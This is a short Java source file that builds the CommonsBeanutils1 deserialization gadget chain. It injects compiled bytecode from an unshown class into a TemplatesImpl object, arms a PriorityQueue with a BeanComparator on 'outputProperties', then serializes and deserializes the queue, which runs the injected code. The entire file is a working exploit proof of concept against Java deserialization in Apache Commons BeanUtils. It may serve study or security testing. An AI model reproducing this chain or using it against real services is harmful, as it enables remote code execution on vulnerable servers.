package commonBeanUtils1;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.beanutils.BeanComparator;

import java.io.*;

import java.util.PriorityQueue;
import javassist.ClassPool;

public class commonBean {
    public static void main(String[] args) throws Exception {
        TemplatesImpl obj=new TemplatesImpl();
        ReflectUtil.setField(obj,"_bytecodes",new byte[][]{ClassPool.getDefault().get(Javac.hello_tempImpl.class.getName()).toBytecode()});
        ReflectUtil.setField(obj,"_name","su85");
        ReflectUtil.setField(obj,"_tfactory",new TransformerFactoryImpl());

        BeanComparator comparator1=new BeanComparator("outputProperties");
        PriorityQueue<Object> queue = new PriorityQueue<Object>(2);
        queue.add("1");
        queue.add("2");

        ReflectUtil.setField(queue,"queue",new Object[]{obj,obj});
        ReflectUtil.setField(queue,"comparator",comparator1);

        ByteArrayOutputStream baos=new ByteArrayOutputStream();
        ObjectOutputStream oos=new ObjectOutputStream(baos);
        oos.writeObject(queue);
        oos.close();

        ByteArrayInputStream bais=new ByteArrayInputStream(baos.toByteArray());
        ObjectInputStream ois=new ObjectInputStream(bais);
        ois.readObject();
    }
}
